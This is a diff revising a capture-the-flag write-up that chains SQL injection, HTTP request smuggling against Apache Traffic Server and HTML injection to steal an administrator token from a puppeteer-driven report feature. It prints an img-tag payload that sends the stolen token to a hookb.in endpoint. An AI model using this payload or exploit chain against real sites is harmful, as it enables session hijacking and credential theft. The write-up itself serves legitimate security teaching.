@@ -1,11 +1,11 @@
 ## PALINDROME's Secret
 
-We are given a website and its source code. There is a login page.
+We are given a website and its source code.
 
 This web application requires 3 exploits to be able to retrieve the flag. 
-1. SQL injection (not your normal SQL payload)
-1. HTTP Request Smuggling (damn cool, never learnt before)
-1. Cross-Site Scripting (sort of, but it is HTML Injection)
+1. SQL injection (not your normal SQL payload) to *log in*
+1. HTTP Request Smuggling (damn cool, never learnt before) to make a request to a protected URL.
+1. Cross-Site Scripting (sort of, but it is HTML Injection) to steal the administrator token.
 
 ![Login Page](./Images/Challenge5_1.png)
 
@@ -38,7 +38,7 @@ This is the login handler. We can use the exploit [here](https://flattsecurity.m
 ```
 ![Login Success](./Images/Challenge5_2.png)
 
-We use burpsuite to intercept the request, change the json object that is POST-ed and then we can login into the portal!
+We use burpsuite to intercept the request, change the json object that is POST-ed and then we can login into the portal! Later on, I needed to keep creating new sessions as I was trying to craft the payload. A faster way to *log in* will be to send a POST request in repeater, without the cookie, when the web server replies with the success message, copy out the generate session token and edit the cookie in firefox to have a fresh session.
 
 ![Login Success GUI](./Images/Challenge5_3.png)
 
@@ -57,7 +57,7 @@ const authenticationMiddleware = async (req, res, next) => {
 }
 ```
 
-The place with the highest chance of SSRF looks like the `report-issue` feature, where we can input an URL to the server to scan. However to get to the `do-report` feature, we are blocked by the proxy. The `do-report` path is mapped to `forbidden`, instead of `do-report`.
+The place with the highest chance of SSRF looks like the `report-issue` feature, where we can input an URL to the server to scan (the server will use puppeteer to visit the URL). However the `do-report` feature is blocked by the proxy. The `do-report` path is mapped to `forbidden`, instead of `do-report`.
 
 ```
 map             /login          http://app:8000/login
@@ -81,9 +81,9 @@ RUN curl -L https://archive.apache.org/dist/trafficserver/trafficserver-9.1.0.ta
     make install
 ```
 
-I was quite sure that it was HTTP request smuggling since the `remap.config` is looks properly configured and the only other way to `/do-report` is through smuggling. I made a detour to think about the final step first. 
+I was quite sure that it was HTTP request smuggling since the `remap.config` looks properly configured and the only other way to `/do-report` is through smuggling. I made a detour to think about the final step first. 
 
-Even if we can make a request to `/do-report`, what URL should we provide it? My first idea was naive. I tried to host a web server which returns javascript to make the puppeteer visit `https://localhost:8000/token` and then return the html response. Well, it failed, because of, CORS. A browser doesn't let you make requests to servers that don't allow CORS.
+Even if we can make a request to `/do-report`, what URL should we provide it? My first idea was naive. I tried to host a web server which returns javascript to make puppeteer visit `https://localhost:8000/token` and then return the html response. Well it failed, because of CORS. A browser doesn't let you make requests to servers that don't allow CORS.
 
 Inside `main.js` we can see this:
 ```js
@@ -113,14 +113,14 @@ This is the example payload in the URL.
 </script>
 ```
 
-Well then the only other way is to really make puppeteer, retrieve the token somewhere inside `localhost:8000` and then return us the token. My first thought was something like reflected XSS, but there is no fields that allow to do so. Persistent XSS was possible though. Inside `/token`, you can input **any** username you want, and then the token generated can be used as XSS inside `/verify?token=...`. It is now clear where to steal the admin token, the admin token will be revealed inside `http://localhost:8000/verify?token=...` right behind the `!{username}` tags.
+Well then the only other way is to really make puppeteer, retrieve the token from somewhere inside `localhost:8000` and then return us the token. My first thought was something like reflected XSS, but there are no fields that allow us to do so. Persistent XSS was possible though. Inside `/token`, you can input **any** username you want, and then the token generated can be used as XSS inside `/verify?token=...`. It is now clear where to steal the admin token, the admin token will be revealed inside `http://localhost:8000/verify?token=...` right behind the `!{username}` tags.
 
 ```pug
             | This token belongs to !{username}.
             | If !{username} asks for your token, you can give them this token: #{token}.
 ```
 
-My first naive idea was to insert `<script>` tags.
+My first idea was to insert `<script>` tags.
 
 ![XSS](./Images/Challenge5_4.png)
 
@@ -140,12 +140,18 @@ It seems like we won't be able to load scripts that are not from the server itse
 Using `<img src="...` as payload. We can see that the second `img src` gets broken off.
 
 ![img src](./Images/Challenge5_6.png)
+
+Our *pathetic* loot from the server:
+
 ![returned payload](./Images/Challenge5_6_1.png)
 
 After experimenting many more payloads, the final payload looks like this. It looks like the HTML injection worked and we can steal the user's token. Now we just need to smuggle the request to this page to the backend server.
 
 ``"><img src="https://hookb.in/6J1enM3l90ToO0ro3Px9?steal=`
 ![img src success](./Images/Challenge5_7.png)
+
+We got our own token back, this means that if the administrator visits this page, we will get the administrator token.
+
 ![returned payload success](./Images/Challenge5_7_1.png)
 
 Now back to the HTTP request smuggling. After some extensive googling, an [HTTP request smuggling exploit](https://hackerone.com/reports/1238099) for ATS 9.0.0 looks promising. I downloaded the `poc.zip` and then used `payload2.py` to craft my payload. I first used hookbin as the URL so that I can check if the HTTP request smuggling succeeded, this particular python payload was able to return a request to my hookbin endpoint.
